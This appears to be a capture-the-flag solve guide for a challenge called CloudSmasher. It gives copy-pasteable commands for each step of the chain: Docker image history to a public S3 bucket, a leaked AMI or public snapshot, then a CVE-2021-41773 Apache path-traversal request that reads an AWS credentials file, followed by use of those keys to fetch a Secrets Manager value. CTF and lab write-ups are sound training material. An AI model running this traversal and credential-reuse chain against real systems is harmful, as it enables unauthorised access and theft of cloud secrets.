# CloudSmasher — Solve Guide (live deployment)

## Description 

Cloudsmashers is a scrappy cloud-infra startup - moving fast, breaking things, and occasionally breaking things in production. Ironically, they run on AWS, their biggest rival. Somewhere down at the public dock, a young whale left in a hurry - half-loaded, container still open, name stenciled right on the hull for anyone to read.


# Guide


This is a copy-pasteable command-by-command solve for the **currently deployed** instance of the
challenge — useful for QA/regression-testing after any infra change. For the general/reusable
version (with placeholders instead of real values), see [`WRITEUP.md`](WRITEUP.md). For the
infra deployment guide (Terraform stacks, setup order, placeholders), see
[`OLD-README.md`](OLD-README.md).

Prerequisites: `docker`, `curl`, `wget`, `terraform`, `aws` CLI, `jq`.

## Step 1 — Find the Docker image

```bash
docker search cloudsmasher
docker pull cloudsmasher/website:latest
docker run -d -p 8080:80 cloudsmasher/website:latest
curl http://localhost:8080/
```

Just a static company page. Nothing useful on the surface.

## Step 2 — Inspect the image history (dead end on `latest`)

```bash
docker history --no-trunc --format "{{.CreatedAt}} {{.CreatedBy}}" cloudsmasher/website:latest
```

Only shows `COPY deploy.sh` + `RUN sh /deploy.sh && rm /deploy.sh` — the script that fetched
anything is deleted before the image finalizes. Nothing to see here directly.

## Step 3 — Notice the repo has more than one tag

```bash
curl -s "https://hub.docker.com/v2/repositories/cloudsmasher/website/tags" | jq '.results[].name'
# ["latest", "v1"]
```

## Step 4 — Pull and inspect the older `v1` tag 


NOTE: You dont need to actaully pulll and see the image - you can directly click on the tag and see the dockerfile commands

```bash
docker pull cloudsmasher/website:v1
docker history --no-trunc --format "{{.CreatedAt}} {{.CreatedBy}}" cloudsmasher/website:v1
```

This reveals the `wget` layers:

```
RUN /bin/sh -c wget https://cloudsmashersbucket-9b5404b3.s3.ap-south-1.amazonaws.com/index.html -O /var/www/html/index.html
RUN /bin/sh -c wget https://cloudsmashersbucket-9b5404b3.s3.ap-south-1.amazonaws.com/styles.css -O /var/www/html/styles.css
RUN /bin/sh -c wget https://cloudsmashersbucket-9b5404b3.s3.ap-south-1.amazonaws.com/cloudsmashers.png -O /var/www/html/assets/cloudsmashers.png
```

Bucket found: `cloudsmashersbucket-9b5404b3` (region `ap-south-1`).

## Step 5 — Enumerate and download from the public bucket

```bash
aws s3 ls s3://cloudsmashersbucket-9b5404b3/ --no-sign-request --region ap-south-1
# 2026-08-05 13:58:44   609633 cloudsmashers.png
# 2026-08-05 13:58:43     1414 index.html
# 2026-08-05 13:58:43     3656 styles.css
# 2026-08-05 15:23:07     2697 undev.tf

wget https://cloudsmashersbucket-9b5404b3.s3.ap-south-1.amazonaws.com/undev.tf
cat undev.tf
```

`undev.tf` is a leaked scrap of WIP Terraform — just a `variable "ami_id"` block with a default
value. It only reveals that a public AMI exists: **`ami-002ec955fc5d94415`**
(`cloudsmashers-webapp-ami-v4`). Nothing else — no ready-made instance, security group, or IAM
role to lean on.

## Step 6 — Boot the AMI yourself

In your own AWS account, launch an instance from the discovered AMI ID (own security group open
on port 80/22, own key pair if you want SSH access):

```bash
aws ec2 run-instances \
  --image-id ami-002ec955fc5d94415 \
  --instance-type t3.micro \
  --key-name <your-key-pair> \
  --security-group-ids <your-sg-allowing-22-and-80> \
  --region ap-south-1
# note the public IP
```

## Step 7 — SSH in, find `development.sh`

```bash
ssh -i your-key.pem ec2-user@<instance_public_ip>
cat /home/ec2-user/projects/development.sh
```

**Alternate route, no booting required:** the AMI's backing EBS snapshot is public too. Anyone who
checks (`aws ec2 describe-snapshot-attribute --snapshot-id <snap-id> --attribute
createVolumePermission`) can mount it directly and read the filesystem without ever launching the
AMI:

```bash
aws ec2 create-volume --snapshot-id <snap-id-from-ami> --availability-zone <az>
aws ec2 attach-volume --volume-id <vol-id> --instance-id <any-instance-you-already-control> --device /dev/sdf
# on that instance:
sudo mount -o ro,nouuid -t xfs /dev/nvme1n1p1 /mnt/snap
cat /mnt/snap/home/ec2-user/projects/development.sh
```

```
#!/bin/bash
# TODO: finish migrating off the old shared box, ask keymaster for access
# Dev server: http://15.252.43.233/
# keymaster has the access keys for our AWS account, check with them
# access.keys will be lying around
```

This instance itself only serves a deprecated static landing page — it's a pointer, not the
target. The real box is at `15.252.43.233`.

## Step 8 — Recon the dev server

```bash
curl -I http://15.252.43.233/
# Server: Apache/2.4.49 (Unix)
curl http://15.252.43.233/
```

The root page is a "Cloudsmashers Internal Staging" contact form — it's a rabbit hole. The submit
button is pure client-side JS (fake "Sending..." delay, then "nothing was sent"); there's no real
backend endpoint behind it, don't waste time fuzzing it.

The real lead is the `Server: Apache/2.4.49` banner — that version is vulnerable to
[CVE-2021-41773](https://www.cve.org/CVERecord?id=CVE-2021-41773), an unauthenticated path
traversal via URL-normalization of aliased paths like `/icons/`.

## Step 9 — Exploit the path traversal

```bash
curl --path-as-is "http://15.252.43.233/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/home/keymaster/access.keys"
```

```ini
[default]
aws_access_key_id = AKIA...
aws_secret_access_key = ...
```

(`/cgi-bin/` returns 404 — mod_cgi is disabled, so this is file-read only, not the RCE variant of
the CVE.)

## Step 10 — Use the leaked keys to reach the flag

```bash
export AWS_ACCESS_KEY_ID=<leaked access key id>
export AWS_SECRET_ACCESS_KEY=<leaked secret access key>
export AWS_DEFAULT_REGION=ap-south-1

aws sts get-caller-identity   # confirms you're keymaster-user
aws secretsmanager list-secrets --query 'SecretList[].Name'
# ["topsecret"]

aws secretsmanager get-secret-value --secret-id topsecret --query 'SecretString' --output text
```

```json
{"flag":"flag{7h3_cl0uD_53cr37s_ar3_0u7}"}
```

## Attack chain summary

```
Docker Hub (cloudsmasher/website:latest)
  -> docker history on latest: dead end (deploy.sh deleted)
    -> notice other tags exist -> pull v1 -> docker history reveals S3 bucket
      -> public S3 bucket -> leaked undev.tf -> hardcoded public AMI ID
        -> boot AMI -> development.sh points to dev server IP
          -> dev server fingerprints as Apache/2.4.49 (CVE-2021-41773)
            -> path traversal -> /home/keymaster/access.keys
              -> aws configure -> secretsmanager:ListSecrets/GetSecretValue
                -> secret "topsecret" -> flag
```
